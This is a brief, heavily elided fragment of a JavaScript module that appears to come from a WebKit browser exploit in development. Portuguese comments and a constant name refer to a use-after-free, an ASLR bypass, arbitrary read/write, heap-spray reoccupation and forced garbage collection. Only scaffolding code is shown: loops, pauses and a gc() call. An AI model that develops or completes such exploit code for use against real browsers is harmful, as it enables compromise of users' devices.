// js/script3/testArrayBufferVictimCrash.mjs (v156 - Otimização de Reocupação UAF e GC)
...
export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Full_UAF_ASLR_ARBRW_v156_OTIMIZADO_REOCUPACAO"; //
...
const LOCAL_CRITICAL_PAUSE = 2000; //
    ...
    if (aggressive) { //
        try {
            ...
            for (let k = 0; k < 3; k++) { // Reduzido ciclos para 3 para evitar OOM
                ...
                await pauseFn(LOCAL_SHORT_PAUSE); // Pequena pausa antes de GC
                if (typeof gc === 'function') { //
                    gc(); // GC explícito para limpar o temp_spray
                }
